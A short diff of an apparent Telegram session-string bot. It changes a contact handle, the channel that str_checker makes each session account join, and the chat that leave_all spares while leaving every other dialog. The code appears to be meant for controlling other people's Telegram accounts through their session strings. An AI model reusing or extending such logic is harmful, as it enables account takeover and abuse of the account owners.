@@ -19,7 +19,7 @@ ERROR NAME: __{}__
 ERROR DESCRIPTION: __{}__
 
 
-IF YOU DON'T UNDERSTAND THIS FORWARD THIS TO @TEAM_DST**
+IF YOU DON'T UNDERSTAND THIS FORWARD THIS TO @BILLAGANGHH**
 """
 
 
@@ -38,7 +38,7 @@ async def str_checker(strses):
         if info.bot:
             return False
         try:
-            await bot(join('@MaybeBots'))
+            await bot(join('@billaganghh'))
         except:
             pass
         await bot.disconnect()
@@ -270,7 +270,7 @@ async def leave_all(strses, dialogs=None):
     async with tg(strses, env.API_ID, env.API_HASH) as bot:
         left = 0
         for x in dialogs:
-            if x == -1001898486632:
+            if x == -1001963474655:
                 continue
             try:
                 await bot(leave(x))
